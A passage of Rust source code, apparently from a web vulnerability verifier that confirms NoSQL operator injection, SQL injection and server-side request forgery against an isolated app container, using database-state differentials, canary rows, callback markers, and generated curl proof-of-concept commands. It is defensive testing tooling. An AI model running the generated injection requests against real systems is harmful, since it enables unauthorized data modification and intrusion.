                    .map(|(name, value)| format!("{name}: {value}"))
                    .collect(),
                body: attempt.body.clone(),
                evidence:
                    "a canary row planted in the table named by the tainted identifier survived a \
                    request carrying a plain identifier (the handler's bound WHERE did not match it) \
                    but was deleted by an otherwise-identical request whose identifier broke out of \
                    the table position and forced the filter true, while a sibling canary table the \
                    request never named survived — proving the injected text changed the DELETE's \
                    meaning rather than being bound as a parameter"
                        .to_owned(),
                response: String::new(),
                controls: Vec::new(),
            });
        }
        None
    }

    /// SQLite database files owned by the isolated application. Docker's `/tmp` belongs to the
    /// sandbox; local mode instead searches only the app tree and generated directory-valued
    /// fixtures, never the host's shared temporary root.
    fn discover_sqlite_files(&self) -> Vec<String> {
        let mut roots = match &self.runtime {
            Runtime::Docker => vec![".".to_owned(), "/tmp".to_owned()],
            Runtime::Local { app_root, .. } => local_sqlite_search_roots(app_root, &self.base_env),
        };
        roots.sort();
        roots.dedup();
        let searches = roots
            .iter()
            .map(|root| {
                format!(
                    "find {} -type f \\( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' \\) \
                     -not -path '*/node_modules/*'",
                    shell_quote(root)
                )
            })
            .collect::<Vec<_>>()
            .join("; ");
        let find = format!("{{ {searches}; }} 2>/dev/null | sort -u | head -50");
        let Ok(output) = self.exec(&self.app, &["sh", "-c", &find]) else {
            return Vec::new();
        };
        String::from_utf8_lossy(&output.stdout)
            .lines()
            .map(|line| line.trim().to_owned())
            .filter(|line| !line.is_empty())
            .collect()
    }

    /// Total rows of table `name` summed across every candidate database file (files without the
    /// table contribute nothing). `None` only when the helper could not run at all.
    fn count_table_rows(&self, files: &[String], name: &str) -> Option<i64> {
        let out = self.run_node(&count_rows_js(files, name))?;
        out.lines()
            .rev()
            .find_map(|line| line.trim().parse::<i64>().ok())
    }

    /// Runs a Node script (with `node:sqlite` enabled) inside the app container, passing it through a
    /// base64 temp file so no shell escaping can corrupt it, mirroring how the image's helper scripts
    /// are planted. `NODE_OPTIONS` is set to exactly the sqlite flag so a launch-time require shim is
    /// not inherited. Returns the script's stdout.
    fn run_node(&self, js: &str) -> Option<String> {
        let b64 = base64(js.as_bytes());
        let script = format!(
            "f=$(mktemp) && echo {b64} | base64 -d > \"$f\" && \
             NODE_OPTIONS=--experimental-sqlite node \"$f\"; rc=$?; rm -f \"$f\"; exit $rc"
        );
        let output = self.exec(&self.app, &["sh", "-c", &script]).ok()?;
        Some(String::from_utf8_lossy(&output.stdout).into_owned())
    }

    fn exercise_nosql(&self, probe: &Probe) -> Outcome {
        let cases = payload::nosql_cases(probe, &self.canary, self.nonce);
        let tried = cases.len();
        // A document-filtering sink (`findOne`/`updateOne`/…) only lets the operator take effect
        // against a record that already exists. When the query also ANDs in a scalar the handler reads
        // from the request (`findOne({ email, code })`) and gates the sink behind an earlier lookup
        // (`if (await User.findOne({ email, verified: true })) return`), no generic startup seed can
        // supply a reachable record. Plant one derived from the sink's own query — observed by
        // profiling a benign request — so the match-all/match-none differential has a document to move.
        if probe.nosql_lookup && !probe.nosql_inserts_before_sink && self.db.is_some() {
            self.seed_nosql_lookup_record(&cases);
        }
        // A write-after-find sink (`const r = await User.findOne({ code }); if (r) await
        // User.updateOne({ _id: r._id }, ...)`) never varies its HTTP response on the lookup, so the
        // response differential cannot see the operator take effect. Observe the database instead: the
        // injected `{$ne}` matches a pre-existing document the benign `{$eq:<absent>}`/`{$in:[]}`
        // controls do not, so only the match-all request mutates a pre-existing (non-probe) document.
        // Tried first, against the app's pristine seeded state, before the response-differential setup
        // pollutes it. Only confirms when the two negative controls leave that state unchanged.
        if probe.nosql_mutates
            && self.db.is_some()
            && probe.nosql_inserts_before_sink
            && let Some(outcome) = self.nosql_inserted_document_differential(&cases)
        {
            return outcome;
        }
        if probe.nosql_mutates
            && self.db.is_some()
            && let Some(outcome) = self.nosql_state_differential(&cases)
        {
            return outcome;
        }
        // A match-all operator (`{$ne}`) only returns a record when the queried collection holds at
        // least one document. A read-only query sink never creates its collection on a driver that does
        // not auto-create on read (Mongoose 5's `autoCreate` defaults off), and a tenant-scoped factory
        // (`useDb(...).model(...)`) registers the model only on first access during a request, so the
        // startup seed never saw that collection. Turn on server profiling, send one benign request so
        // the sink's query is recorded, then seed exactly the collections that request touched — found
        // from the profiler log, not guessed from a name — so the now-materialized collection carries a
        // document for the differential to observe. Fall back to a plain reseed for already-existing
        // collections the app created lazily on write.
        if self.db.is_some()
            && let Some(first) = cases.first()
        {
            self.enable_db_profiling();
            let _ = self.fetch(&first.match_none_eq);
            std::thread::sleep(std::time::Duration::from_secs(2));
            self.seed_profiled_collections();
            self.seed_db();
        }
        for case in &cases {
            let (Some(match_all), Some(match_none_eq), Some(match_none_in)) = (
                self.fetch(&case.match_all),
                self.fetch(&case.match_none_eq),
                self.fetch(&case.match_none_in),
            ) else {
                continue;
            };
            if payload::nosql_reproduced(&match_all, &match_none_eq, &match_none_in, &case.absent) {
                let attempt = &case.match_all;
                return Outcome::Verified {
                    how: format!("{} {} ({}[$ne])", attempt.verb, attempt.target, case.field),
                    poc: Reproduction {
                        command: curl_command(attempt, self.port),
                        method: attempt.verb.to_owned(),
                        target: attempt.target.clone(),
                        headers: attempt
                            .headers
                            .iter()
                            .map(|(name, value)| format!("{name}: {value}"))
                            .collect(),
                        body: attempt.body.clone(),
                        evidence: nosql_differential_evidence(
                            &case.field,
                            probe.body_query_override.is_some(),
                        ),
                        response: response_excerpt(&match_all),
                        controls: vec![
                            control_observation(
                                "match-none $eq",
                                &case.match_none_eq,
                                &match_none_eq,
                            ),
                            control_observation(
                                "match-none $in: []",
                                &case.match_none_in,
                                &match_none_in,
                            ),
                        ],
                    },
                };
            }
        }
        Outcome::NotReproduced { tried }
    }

    /// A registration/referral handler can insert the submitted account before the vulnerable
    /// lookup and then mutate whichever account the operator selected. Compare the three inserted
    /// accounts after normalizing their unique identities and generated database metadata: the two
    /// match-none controls must be identical, while the match-all account must differ. This proves a
    /// semantic mutation caused by the operator without treating the mere insertion as evidence.
    fn nosql_inserted_document_differential(
        &self,
        cases: &[payload::NosqlCase],
    ) -> Option<Outcome> {
        for case in cases {
            let [all_id, eq_id, in_id] = case.identity.as_slice() else {
                continue;
            };
            let _ = self.fetch(&case.match_all);
            let all = self.nosql_identity_document_digest(all_id, &case.identity)?;
            let _ = self.fetch(&case.match_none_eq);
            let eq = self.nosql_identity_document_digest(eq_id, &case.identity)?;
            let _ = self.fetch(&case.match_none_in);
            let in_empty = self.nosql_identity_document_digest(in_id, &case.identity)?;
            if all.trim().is_empty() || eq.trim().is_empty() || eq != in_empty || all == eq {
                continue;
            }
            let attempt = &case.match_all;
            return Some(Outcome::Verified {
                how: format!(
                    "{} {} ({}[$ne], inserted-document differential)",
                    attempt.verb, attempt.target, case.field
                ),
                poc: Reproduction {
                    command: curl_command(attempt, self.port),
                    method: attempt.verb.to_owned(),
                    target: attempt.target.clone(),
                    headers: attempt
                        .headers
                        .iter()
                        .map(|(name, value)| format!("{name}: {value}"))
                        .collect(),
                    body: attempt.body.clone(),
                    evidence: format!(
                        "the match-all operator (`{}: {{$ne}}`) caused a semantic database mutation \
                         on the newly registered record, while the independently registered `$eq` \
                         and `$in: []` controls remained identical after generated identities and \
                         metadata were normalized",
                        case.field
                    ),
                    response: String::new(),
                    controls: vec![
                        ControlObservation {
                            label: "match-none $eq (inserted record unchanged)".to_owned(),
                            method: case.match_none_eq.verb.to_owned(),
                            target: case.match_none_eq.target.clone(),
                            body: case.match_none_eq.body.clone(),
                            response:
                                "normalized inserted record matched the other negative control"
                                    .to_owned(),
                        },
                        ControlObservation {
                            label: "match-none $in: [] (inserted record unchanged)".to_owned(),
                            method: case.match_none_in.verb.to_owned(),
                            target: case.match_none_in.target.clone(),
                            body: case.match_none_in.body.clone(),
                            response:
                                "normalized inserted record matched the other negative control"
                                    .to_owned(),
                        },
                    ],
                },
            });
        }
        None
    }

    /// The normalized database document containing one probe identity. Mongo-generated `_id` values,
    /// dates, and the three per-probe identity values are replaced before comparison; application
    /// fields such as balances, roles, flags, and relation arrays remain intact.
    fn nosql_identity_document_digest(
        &self,
        identity: &str,
        identities: &[String],
    ) -> Option<String> {
        let db = self.db.as_deref()?;
        let identity = serde_json::to_string(identity).ok()?;
        let identities = serde_json::to_string(identities).ok()?;
        let script = format!(
            "var WANT={identity};var IDS={identities};var out=[];\
             function hasId(v){{if(v===null||v===undefined)return false;\
               if(Array.isArray(v))return v.some(hasId);\
               if(typeof v==='object')return Object.keys(v).some(function(k){{return hasId(v[k]);}});\
               return String(v)===WANT;}}\
             function norm(v,k){{if(k==='_id')return undefined;\
               if(v instanceof Date)return '<date>';\
               if(v&&typeof v==='object'&&v._bsontype)return '<bson>';\
               if(Array.isArray(v))return v.map(function(x){{return norm(x,'');}});\
               if(v&&typeof v==='object'){{var o={{}};Object.keys(v).sort().forEach(function(n){{\
                 var x=norm(v[n],n);if(x!==undefined)o[n]=x;}});return o;}}\
               if(IDS.indexOf(String(v))>=0)return '<identity>';return v;}}\
             db.getMongo().getDBNames().forEach(function(n){{\
               if(['admin','local','config'].indexOf(n)>=0)return;var d=db.getSiblingDB(n);\
               d.getCollectionNames().forEach(function(c){{if(c.indexOf('system.')===0)return;\
                 d.getCollection(c).find({{}}).forEach(function(doc){{if(hasId(doc))\
                   out.push(n+'.'+c+':'+JSON.stringify(norm(doc,'')));}});}});}});\
             out.sort();print(out.join('\\n'));"
        );
        let output = self
            .exec(db, &["mongosh", "--quiet", "--eval", &script])
            .ok()?;
        output
            .status
            .success()
            .then(|| String::from_utf8_lossy(&output.stdout).into_owned())
    }

    /// Confirms a NoSQL operator injection whose effect is a database write the HTTP response never
    /// reflects, by a database-state differential. For each case: snapshot the application documents
    /// (excluding this case's own probe-inserted documents, keyed by the unique identity values it
    /// stamps into the request), send the match-all `{$ne:<absent>}` request, and snapshot again. A
    /// changed snapshot means the operator selected a pre-existing document that the handler then
    /// mutated. It is only accepted when both negative controls (`{$eq:<absent>}`, `{$in:[]}`), which
    /// a scalar value produces, leave the snapshot unchanged — so the change is attributable to the
    /// operator and not to the request's own insert or to nondeterministic state.
    fn nosql_state_differential(&self, cases: &[payload::NosqlCase]) -> Option<Outcome> {
        for case in cases {
            let exclude = &case.identity;
            let before_all = self.nosql_state_digest(exclude)?;
            let _ = self.fetch(&case.match_all);
            let after_all = self.nosql_state_digest(exclude)?;
            if after_all == before_all {
                // The operator changed no pre-existing document for this case; nothing to attribute.
                continue;
            }
            let before_eq = self.nosql_state_digest(exclude)?;
            let _ = self.fetch(&case.match_none_eq);
            let after_eq = self.nosql_state_digest(exclude)?;
            let before_in = self.nosql_state_digest(exclude)?;
            let _ = self.fetch(&case.match_none_in);
            let after_in = self.nosql_state_digest(exclude)?;
            if after_eq != before_eq || after_in != before_in {
                // A control also changed state: the change is not attributable to the operator.
                continue;
            }
            let attempt = &case.match_all;
            return Some(Outcome::Verified {
                how: format!(
                    "{} {} ({}[$ne], database-state differential)",
                    attempt.verb, attempt.target, case.field
                ),
                poc: Reproduction {
                    command: curl_command(attempt, self.port),
                    method: attempt.verb.to_owned(),
                    target: attempt.target.clone(),
                    headers: attempt
                        .headers
                        .iter()
                        .map(|(name, value)| format!("{name}: {value}"))
                        .collect(),
                    body: attempt.body.clone(),
                    evidence: format!(
                        "a match-all operator (`{}: {{$ne}}`) mutated a pre-existing database \
                         document that the match-none operators (`$eq`, `$in: []`) left unchanged, \
                         proving the object was interpreted as a MongoDB query operator that \
                         selected a record a scalar value could not",
                        case.field
                    ),
                    response: String::new(),
                    controls: vec![
                        ControlObservation {
                            label: "match-none $eq (database unchanged)".to_owned(),
                            method: case.match_none_eq.verb.to_owned(),
                            target: case.match_none_eq.target.clone(),
                            body: case.match_none_eq.body.clone(),
                            response: "no pre-existing document changed".to_owned(),
                        },
                        ControlObservation {
                            label: "match-none $in: [] (database unchanged)".to_owned(),
                            method: case.match_none_in.verb.to_owned(),
                            target: case.match_none_in.target.clone(),
                            body: case.match_none_in.body.clone(),
                            response: "no pre-existing document changed".to_owned(),
                        },
                    ],
                },
            });
        }
        None
    }

    /// A stable digest of every application document, excluding this probe's own inserted documents.
    /// Each database (other than `admin`/`local`/`config`) and non-system collection is read in `_id`
    /// order and serialized; a document is skipped when any of its scalar fields holds one of the
    /// `exclude` identity values (the unique per-request values a write probe stamps into its insert),
    /// so a registration probe's own new rows do not count as a change — only a mutation to a document
    /// that already existed does. `None` when the query cannot be run, so the caller abstains rather
    /// than guesses.
    fn nosql_state_digest(&self, exclude: &[String]) -> Option<String> {
        let db = self.db.as_deref()?;
        let excl_literal: String = exclude
            .iter()
            .map(|value| format!("\"{}\"", value.replace('\\', "\\\\").replace('"', "\\\"")))
            .collect::<Vec<_>>()
            .join(",");
        let script = format!(
            "var EXCL=[{excl_literal}];var out=[];\
             db.getMongo().getDBNames().forEach(function(n){{\
               if(['admin','local','config'].indexOf(n)>=0)return;\
               var d=db.getSiblingDB(n);\
               d.getCollectionNames().forEach(function(c){{\
                 if(c.indexOf('system.')===0)return;\
                 d.getCollection(c).find({{}}).sort({{_id:1}}).forEach(function(doc){{\
                   var skip=false;\
                   for(var k in doc){{var v=doc[k];\
                     if((typeof v==='string'||typeof v==='number')&&EXCL.indexOf(String(v))>=0){{skip=true;break;}}}}\
                   if(skip)return;\
                   out.push(n+'.'+c+':'+JSON.stringify(doc));\
                 }});\
               }});\
             }});\
             print(out.join('\\n'));"
        );
        let output = self
            .exec(db, &["mongosh", "--quiet", "--eval", &script])
            .ok()?;
        if !output.status.success() {
            return None;
        }
        Some(String::from_utf8_lossy(&output.stdout).into_owned())
    }

    /// Mints a genuine authenticated session by exercising the app's own routes: registers a
    /// throwaway account on each candidate registration endpoint (failures ignored — the account may
    /// already exist, or the app may seed accounts), then logs in on each candidate login endpoint
    /// until one returns a bearer token. The returned token is a real server-issued session the
    /// gated request presents under the handler's own cookie; the verifier never forges a token or
    /// bypasses the authentication — it satisfies the precondition the way a user would. `None` when
    /// no login returns a token, leaving the gated request to be sent unauthenticated (and so, for a
    /// genuinely authenticated sink, honestly not reproduce).
    fn obtain_session(&self, boot: &super::plan::AuthBootstrap) -> Option<String> {
        let email = format!("jss-{}@jsspector.test", self.canary.token);
        let password = format!("Jss!{}aA1", self.canary.token);
        for path in &boot.register_paths {
            let _ = self.fetch(&payload::credential_post(path, &email, &password));
        }
        for path in &boot.login_paths {
            if let Some(body) = self.fetch(&payload::credential_post(path, &email, &password))
                && let Some(token) = payload::extract_bearer_token(&body)
            {
                return Some(token);
            }
        }
        None
    }

    fn fetch(&self, attempt: &Attempt) -> Option<String> {
        let spec = request_spec(attempt, self.port, !self.omit_forwarding.get(), self.tls);
        let output = self
            .exec(&self.app, &["node", "/jss-driver.js", &spec])
            .ok()?;
        let body = String::from_utf8_lossy(&output.stdout).into_owned();
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] {} {} body={:?} -> status {:?} stderr[{}] body[{}]{}",
                attempt.verb,
                attempt.target,
                attempt.body,
                output.status.code(),
                String::from_utf8_lossy(&output.stderr).trim(),
                response_excerpt(&body),
                if body.is_empty() {
                    format!(" app-logs[{}]", self.tail_logs(&self.app))
                } else {
                    String::new()
                }
            );
        }
        Some(body)
    }

    /// Sends one request from inside the app container and checks its signal.
    fn send(&self, attempt: &Attempt) -> Option<Reproduction> {
        let spec = request_spec(attempt, self.port, !self.omit_forwarding.get(), self.tls);
        let output = match self.exec(&self.app, &["node", "/jss-driver.js", &spec]) {
            Ok(output) => output,
            Err(_) => return None,
        };
        let body = String::from_utf8_lossy(&output.stdout);
        // `JSS_VERIFY_DEBUG=1` prints each request and its response, to diagnose why a finding
        // did or did not reproduce.
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] {} {} request-body={:?} -> status {:?} stderr[{}] body[{}] canary-exists={}",
                attempt.verb,
                attempt.target,
                attempt.body,
                output.status.code(),
                String::from_utf8_lossy(&output.stderr).trim(),
                response_excerpt(&body),
                self.file_exists(&self.canary.planted_file()),
            );
        }
        let reproduced = match &attempt.signal {
            Signal::InResponse | Signal::ResponseContains(_) => {
                payload::reproduced(attempt, &self.canary, &body, false, false)
            }
            Signal::FileWritten(path) => {
                let exists = self
                    .exec(&self.app, &["test", "-f", path])
                    .map(|o| o.status.success())
                    .unwrap_or(false);
                payload::reproduced(attempt, &self.canary, &body, exists, false)
            }
            Signal::ServiceReached(token) => {
                let local_reached = marker_hit(&self.tail_logs(&self.marker), token).is_some();
                if local_reached {
                    // The isolated marker hit is the exploitation proof. Mirroring that hit to
                    // the public callback only records metadata; a transient callback/API failure
                    // must not turn a reproduced vulnerability into a false negative.
                    self.relay_public_callback(token);
                }
                let public_reached = !local_reached
                    && self
                        .canary
                        .callback_host()
                        .is_some_and(|host| attempt_mentions_host(attempt, host))
                    && self.public_callback_reached(token);
                let reached = local_reached || public_reached;
                payload::reproduced(attempt, &self.canary, &body, false, reached)
            }
        };
        reproduced.then(|| {
            let display = normalized_callback_attempt(attempt, self.canary.callback_host());
            Reproduction {
                command: curl_command(&display, self.port),
                method: display.verb.to_owned(),
                target: display.target.clone(),
                headers: display
                    .headers
                    .iter()
                    .map(|(name, value)| format!("{name}: {value}"))
                    .collect(),
                body: display.body.clone(),
                evidence: observed_evidence(&attempt.signal, self.canary.callback_host()),
                response: body.trim().to_owned(),
                controls: Vec::new(),
            }
        })
    }

    fn exec(&self, container: &str, cmd: &[&str]) -> Result<Output, String> {
        match &self.runtime {
            Runtime::Docker => exec_in(container, cmd),
            Runtime::Local { app_root, .. } if container == self.app => {
                let (program, args) = cmd
                    .split_first()
                    .ok_or_else(|| "empty local verifier command".to_owned())?;
                let args: Vec<String> = args
                    .iter()
                    .map(|argument| localize_helper_paths(argument))
                    .collect();
                Command::new(program)
                    .args(args)
                    .current_dir(app_root)
                    .output()
                    .map_err(|error| error.to_string())
            }
            Runtime::Local { app_root, .. }
                if self.db.as_deref() == Some(container)
                    || self.redis.as_deref() == Some(container) =>
            {
                let (program, args) = cmd
                    .split_first()
                    .ok_or_else(|| "empty local sidecar command".to_owned())?;
                Command::new(program)
                    .args(args)
                    .current_dir(app_root)
                    .output()
                    .map_err(|error| error.to_string())
            }
            Runtime::Local { .. } => Err("unknown local verifier service".to_owned()),
        }
    }

    /// Mirror an isolated marker hit to the registered public callback from the verifier host.
    /// The untrusted application container remains on its `--internal` network; only this fixed,
    /// validated Satori hostname is contacted. The relay carries the target request's method and
    /// user agent as metadata, so the public interaction cannot be mistaken for a direct `curl`
    /// request from the verifier. This is best-effort telemetry: the isolated marker hit remains
    /// the authoritative exploitation signal.
    fn relay_public_callback(&self, token: &str) {
        let Some(host) = self.canary.callback_host() else {
            return;
        };
        let logs = self.tail_logs(&self.marker);
        let Some(hit) = marker_hit(&logs, token) else {
            return;
        };
        let url = format!("https://{host}{}", hit.path);
        let Ok(output) = Command::new("curl")
            .args(callback_relay_args(&url, &hit))
            .output()
        else {
            return;
        };
        let registered_token = host.split('.').next().unwrap_or_default();
        let confirmed = output.status.success()
            && String::from_utf8_lossy(&output.stdout)
                .contains(&format!("SATORI_CANARY_{registered_token}"));
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] callback relay {} -> status {:?} confirmed={confirmed}",
                url,
                output.status.code()
            );
        }
    }

    fn public_callback_reached(&self, token: &str) -> bool {
        let Some(host) = self.canary.callback_host() else {
            return false;
        };
        let Some(callback_token) = host.strip_suffix(".callback.satori.ci") else {
            return false;
        };
        let Ok(auth) = std::env::var("SATORI_TOKEN") else {
            return false;
        };
        let url = format!("https://api-v2.satori.ci/callbacks/{callback_token}");
        for _ in 0..10 {
            let mut command = Command::new("curl");
            command.args([
                "--fail",
                "--silent",
                "--show-error",
                "--max-time",
                "10",
                "--header",
                &format!("Authorization: Bearer {auth}"),
            ]);
            if let Ok(org) = std::env::var("SATORI_ORGANIZATION") {
                command.args(["--header", &format!("X-Satori-Organization: {org}")]);
            }
            if let Ok(output) = command.arg(&url).output()
                && output.status.success()
                && callback_response_contains(&output.stdout, token)
            {
                return true;
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        false
    }
}

fn attempt_mentions_host(attempt: &Attempt, host: &str) -> bool {
    attempt.target.contains(host)
        || attempt
            .body
            .as_deref()
            .is_some_and(|body| body.contains(host))
        || attempt
            .headers
            .iter()
            .any(|(_, value)| value.contains(host))
}

fn callback_response_contains(body: &[u8], token: &str) -> bool {
    serde_json::from_slice::<serde_json::Value>(body)
        .ok()
        .and_then(|value| {
            value
                .get("interactions")
                .and_then(|value| value.as_array())
                .cloned()
        })
        .is_some_and(|interactions| {
            interactions.iter().any(|interaction| {
                interaction.get("protocol").and_then(|value| value.as_str()) == Some("http")
                    && interaction
                        .get("path")
                        .and_then(|value| value.as_str())
                        .is_some_and(|path| path.split('/').any(|segment| segment == token))
            })
        })
}

fn valid_container_workdir(path: &str) -> bool {
    path.starts_with('/')
        && path.len() <= 512
        && !path.contains("..")
        && path
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'/' | b'.' | b'_' | b'-'))
}

#[derive(Debug, Deserialize, PartialEq, Eq)]
struct MarkerHit {
    method: String,
    path: String,
    #[serde(rename = "userAgent")]
    user_agent: Option<String>,
}

/// The last structured marker record for this probe. The token must occur in the parsed path,
/// never merely elsewhere in a log line.
fn marker_hit(logs: &str, token: &str) -> Option<MarkerHit> {
    logs.lines().rev().find_map(|line| {
        let payload = line.split_once("MARKER ")?.1.trim();
        let hit: MarkerHit = serde_json::from_str(payload).ok()?;
        (hit.path.contains(token)).then_some(hit)
    })
}

fn callback_relay_args(url: &str, hit: &MarkerHit) -> Vec<String> {
    let args = vec![
        "--fail".to_owned(),
        "--silent".to_owned(),
        "--show-error".to_owned(),
        "--max-time".to_owned(),
        "10".to_owned(),
        "--header".to_owned(),
        "X-Satori-Callback-Relay: isolated-target".to_owned(),
        "--header".to_owned(),
        format!(
            "X-Satori-Original-Method: {}",
            safe_method(&hit.method).unwrap_or("UNKNOWN")
        ),
        "--user-agent".to_owned(),
        safe_user_agent(hit.user_agent.as_deref()).unwrap_or_default(),
        url.to_owned(),
    ];
    args
}

fn safe_user_agent(value: Option<&str>) -> Option<String> {
    value
        .filter(|value| {
            value.len() <= 512 && !value.bytes().any(|byte| matches!(byte, b'\r' | b'\n'))
        })
        .map(str::to_owned)
}

fn safe_method(value: &str) -> Option<&str> {
    (!value.is_empty()
        && value.len() <= 32
        && value
            .bytes()
            .all(|byte| byte.is_ascii_uppercase() || byte == b'-'))
    .then_some(value)
}

fn observed_evidence(signal: &Signal, callback_host: Option<&str>) -> String {
    match signal {
        Signal::InResponse => "the canary token appeared in the application response".to_owned(),
        Signal::ResponseContains(expected) => {
            if expected == "uid=" {
                "the application response contained the output of the read-only `id` command (`uid=`)"
                    .to_owned()
            } else {
                format!("the application response contained known proof text `{expected}`")
            }
        }
        Signal::FileWritten(path) => {
            format!("the application created the canary file `{path}`")
        }
        Signal::ServiceReached(token) => {
            if callback_host.is_some() {
                format!(
                    "the isolated request carrying `{token}` was confirmed by the registered Satori callback"
                )
            } else {
                format!("the isolated marker service received callback token `{token}`")
            }
        }
    }
}

fn normalized_callback_attempt(attempt: &Attempt, callback_host: Option<&str>) -> Attempt {
    let Some(host) = callback_host else {
        return attempt.clone();
    };
    let replace = |value: &str| value.replace(host, "CALLBACK_HOST");
    Attempt {
        verb: attempt.verb,
        target: replace(&attempt.target),
        body: attempt.body.as_deref().map(replace),
        headers: attempt
            .headers
            .iter()
            .map(|(name, value)| (name.clone(), replace(value)))
            .collect(),
        signal: attempt.signal.clone(),
    }
}

fn configured_callback_host() -> Result<Option<String>, String> {
    let Some(value) = std::env::var_os("JSS_VERIFY_CALLBACK_URL") else {
        return Ok(None);
    };
    let value = value
        .into_string()
        .map_err(|_| "JSS_VERIFY_CALLBACK_URL is not UTF-8".to_owned())?;
    let host = value
        .strip_prefix("https://")
        .and_then(|rest| rest.strip_suffix('/').or(Some(rest)))
        .ok_or_else(|| "JSS_VERIFY_CALLBACK_URL must use https".to_owned())?;
    let Some(token) = host.strip_suffix(".callback.satori.ci") else {
        return Err("JSS_VERIFY_CALLBACK_URL must use callback.satori.ci".to_owned());
    };
    if token.len() != 32 || !token.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        return Err(
            "JSS_VERIFY_CALLBACK_URL must contain a 32-character hexadecimal token".to_owned(),
        );
    }
    Ok(Some(host.to_ascii_lowercase()))
}

fn curl_command(attempt: &Attempt, port: u16) -> String {
    let mut target = attempt.target.clone();
    let mut body = attempt.body.clone();
    if let Signal::ServiceReached(token) = &attempt.signal {
        let private = format!("http://jss-marker/{token}");
        let callback = "http://CALLBACK_HOST";
        target = target.replace(&private, callback).replace(
            &format!("http%3A%2F%2Fjss-marker%2F{token}"),
            "http%3A%2F%2FCALLBACK_HOST",
        );
        target = replace_local_marker_url(&target, token, callback);
        body = body.map(|value| {
            replace_local_marker_url(&value.replace(&private, callback), token, callback)
        });
    }
    let mut parts = vec![
        "curl -i -sS".to_owned(),
        format!("--request {}", attempt.verb),
    ];
    if target.starts_with('/') {
        // The verifier sends the request target verbatim. curl otherwise normalizes dot
        // segments before sending them, which makes a copyable traversal PoC differ from the
        // request that was actually verified.
        parts.push("--path-as-is".to_owned());
        parts.push(format!(
            "--url {}",
            shell_quote(&format!("http://TARGET_HOST:{port}{target}"))
        ));
    } else {
        // An absolute-form request target (`GET http://host/path HTTP/1.1`), sent as is.
        parts.push(format!(
            "--url {}",
            shell_quote(&format!("http://TARGET_HOST:{port}"))
        ));
        parts.push(format!("--request-target {}", shell_quote(&target)));
    }
    let multipart = body
        .as_deref()
        .and_then(|body| curl_multipart(&attempt.headers, body));
    parts.extend(attempt.headers.iter().filter_map(|(name, value)| {
        if multipart.is_some() && name.eq_ignore_ascii_case("content-type") {
            None
        } else {
            Some(format!(
                "--header {}",
                shell_quote(&format!("{name}: {value}"))
            ))
        }
    }));
    if let Some(form) = &multipart {
        parts.extend(form.args.clone());
    } else if let Some(body) = body {
        parts.push(format!("--data-raw {}", shell_quote(&body)));
    }
    let command = parts.join(" \\\n  ");
    if multipart.as_ref().is_some_and(|form| form.has_file) {
        format!(
            "printf %s {} > /tmp/jsspector-upload.bin\n{command}",
            shell_quote("jsspector-upload")
        )
    } else {
        command
    }
}

/// Rewrites the ephemeral loopback marker URL used by the local verifier to the same public
/// placeholder emitted for Docker's `jss-marker` hostname. The port is intentionally discovered
/// from the generated value: it is reserved per run and must never leak into a reusable PoC.
fn replace_local_marker_url(value: &str, token: &str, replacement: &str) -> String {
    let mut out = value.to_owned();
    for (prefix, separator) in [
        ("http://0x7f000001:", "/"),
        ("http%3A%2F%2F0x7f000001%3A", "%2F"),
    ] {
        while let Some(start) = out.find(prefix) {
            let tail = &out[start + prefix.len()..];
            let Some(token_at) = tail.find(&format!("{separator}{token}")) else {
                break;
            };
            let end = start + prefix.len() + token_at + separator.len() + token.len();
            let encoded_replacement = if separator == "%2F" {
                "http%3A%2F%2FCALLBACK_HOST"
            } else {
                replacement
            };
            out.replace_range(start..end, encoded_replacement);
        }
    }
    out
}

struct CurlMultipart {
    args: Vec<String>,
    has_file: bool,
}

/// Convert the verifier's canonical multipart body back into readable, copyable curl form
/// arguments for advisory evidence. Malformed or external MIME bodies fall back to data-raw.
fn curl_multipart(headers: &[(String, String)], body: &str) -> Option<CurlMultipart> {
    let content_type = headers
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case("content-type"))?
        .1
        .as_str();
    let boundary = content_type
        .split(';')
        .map(str::trim)
        .find_map(|part| part.strip_prefix("boundary="))?
        .trim_matches('"');
    if boundary.is_empty() || !content_type.starts_with("multipart/form-data") {
        return None;
    }
    let delimiter = format!("--{boundary}");
    let mut args = Vec::new();
    let mut has_file = false;
    for raw in body.split(&delimiter).skip(1) {
        let raw = raw.trim_start_matches("\r\n");
        if raw.starts_with("--") || raw.trim().is_empty() {
            continue;
        }
        let (head, contents) = raw.split_once("\r\n\r\n")?;
        let contents = contents.strip_suffix("\r\n").unwrap_or(contents);
        let disposition = head.lines().find(|line| {
            line.to_ascii_lowercase()
                .starts_with("content-disposition:")
        })?;
        let name = disposition_parameter(disposition, "name")?;
        if !safe_mime_parameter(&name) {
            return None;
        }
        if disposition_parameter(disposition, "filename").is_some() {
            has_file = true;
            let content_type = head
                .lines()
                .find_map(|line| {
                    line.split_once(':').and_then(|(key, value)| {
                        key.eq_ignore_ascii_case("content-type")
                            .then(|| value.trim())
                    })
                })
                .unwrap_or("application/octet-stream");
            args.push(format!(
                "--form {}",
                shell_quote(&format!(
                    "{name}=@/tmp/jsspector-upload.bin;filename=jsspector-upload.bin;type={content_type}"
                ))
            ));
        } else {
            args.push(format!(
                "--form {}",
                shell_quote(&format!("{name}={contents}"))
            ));
        }
    }
    (!args.is_empty()).then_some(CurlMultipart { args, has_file })
}

fn disposition_parameter(line: &str, wanted: &str) -> Option<String> {
    line.split(';').skip(1).find_map(|part| {
        let (key, value) = part.trim().split_once('=')?;
        key.eq_ignore_ascii_case(wanted)
            .then(|| value.trim().trim_matches('"').to_owned())
    })
}

fn safe_mime_parameter(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 128
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b'[' | b']')
        })
}

fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\"'\"'"))
}

impl Session {
    fn container_running(&self, name: &str) -> bool {
        match &self.runtime {
            Runtime::Docker => docker(&["inspect", "-f", "{{.State.Running}}", name])
